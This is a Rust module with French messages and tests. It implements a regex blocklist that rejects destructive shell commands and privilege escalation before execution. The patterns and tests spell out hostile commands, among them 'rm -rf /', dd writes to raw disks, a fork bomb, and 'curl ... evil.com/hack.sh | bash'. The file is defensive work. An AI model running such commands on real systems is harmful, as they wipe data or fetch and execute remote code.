use regex::Regex;
use thiserror::Error;

#[derive(Error, Debug, PartialEq)]
pub enum BlocklistError {
    #[error("COMMANDE DESTRUCTRICE BLOQUÉE PAR SÉCURITÉ : '{0}' ({1})")]
    DestructiveCommand(String, &'static str),
    #[error("UTILISATION DE PRIVILÈGES ROOT INTERDITE : '{0}' ({1})")]
    PrivilegeEscalation(String, &'static str),
}

pub struct CommandBlocklist {
    rules: Vec<(Regex, &'static str, bool)>, // (Regex, Motif, is_privilege)
}

impl CommandBlocklist {
    pub fn new() -> Self {
        let raw_rules: Vec<(&str, &'static str, bool)> = vec![
            // Commandes destructrices globales
            (r"(?i)\brm\s+(-[a-z]*r[a-z]*f[a-z]*|-[a-z]*f[a-z]*r[a-z]*)\s+([~/]|\$HOME|\$\{HOME\}|/\*)(\s+|$)", "Suppression récursive de la racine ou du répertoire personnel", false),
            (r"(?i)\bmkfs(\.[a-z0-9]+)?\s+", "Formatage d'un système de fichiers", false),
            (r"(?i)\bwipefs\s+", "Effacement des signatures de partitions", false),
            (r"(?i)\bdd\s+.*of=/dev/(sd[a-z]|nvme[0-9]|vd[a-z]|mapper|dm-)", "Écriture directe sur un périphérique de stockage brut", false),
            (r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:", "Fork bomb détectée", false),
            (r"(?i)\b(curl|wget)\s+[^|;&]+\|\s*(sh|bash|zsh|dash)", "Exécution directe de script distant via pipe (curl | sh)", false),
            (r"(?i)\bchmod\s+(-[a-z]*R[a-z]*\s+)?(777|a\+rwx)\s+/\b", "Modification des permissions de la racine système", false),
            (r"(?i)\bchown\s+-[a-z]*R[a-z]*\s+[^/]+/\b", "Modification du propriétaire de la racine système", false),
            (r"(?i)>\s*/dev/(sd[a-z]|nvme[0-9]|null\s*;\s*reboot)", "Redirection directe destructrice", false),
            (r"(?i)>\s*/proc/sysrq-trigger", "Déclenchement SysRq noyau forcé", false),

            // Tentative d'escalade de privilèges
            (r"(?i)\b(sudo|pkexec|doas)\s+", "Tentative d'escalade de privilèges", true),
            (r"(?i)\bsu\s+-\s*([a-z0-9_-]*)", "Changement d'utilisateur interactif", true),
        ];

        let rules = raw_rules
            .into_iter()
            .map(|(pattern, desc, is_priv)| {
                (
                    Regex::new(pattern).expect("Pattern regex blocklist invalide"),
                    desc,
                    is_priv,
                )
            })
            .collect();

        Self { rules }
    }

    /// Valide une commande brute et retourne une erreur si elle correspond à un schéma interdit
    pub fn validate_command(&self, cmd: &str) -> Result<(), BlocklistError> {
        let trimmed = cmd.trim();

        for (regex, description, is_privilege) in &self.rules {
            if regex.is_match(trimmed) {
                if *is_privilege {
                    return Err(BlocklistError::PrivilegeEscalation(
                        trimmed.to_string(),
                        description,
                    ));
                } else {
                    return Err(BlocklistError::DestructiveCommand(
                        trimmed.to_string(),
                        description,
                    ));
                }
            }
        }

        Ok(())
    }
}

impl Default for CommandBlocklist {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rm_rf_root_blocked() {
        let blocklist = CommandBlocklist::new();
        assert!(blocklist.validate_command("rm -rf /").is_err());
        assert!(blocklist.validate_command("rm -fr /").is_err());
        assert!(blocklist.validate_command("rm -rf /*").is_err());
        assert!(blocklist.validate_command("rm -rf ~").is_err());
        assert!(blocklist.validate_command("rm -rf $HOME").is_err());
    }

    #[test]
    fn test_sudo_blocked() {
        let blocklist = CommandBlocklist::new();
        assert!(blocklist.validate_command("sudo apt-get update").is_err());
        assert!(blocklist.validate_command("sudo rm file.txt").is_err());
    }

    #[test]
    fn test_dd_to_disk_blocked() {
        let blocklist = CommandBlocklist::new();
        assert!(blocklist.validate_command("dd if=/dev/zero of=/dev/sda bs=1M").is_err());
    }

    #[test]
    fn test_curl_pipe_sh_blocked() {
        let blocklist = CommandBlocklist::new();
        assert!(blocklist.validate_command("curl -sSL https://evil.com/hack.sh | bash").is_err());
    }

    #[test]
    fn test_legitimate_commands_allowed() {
        let blocklist = CommandBlocklist::new();
        assert!(blocklist.validate_command("ls -la").is_ok());
        assert!(blocklist.validate_command("cargo build --release").is_ok());
        assert!(blocklist.validate_command("npm test").is_ok());
        assert!(blocklist.validate_command("rm -rf ./build").is_ok());
        assert!(blocklist.validate_command("git status").is_ok());
    }
}
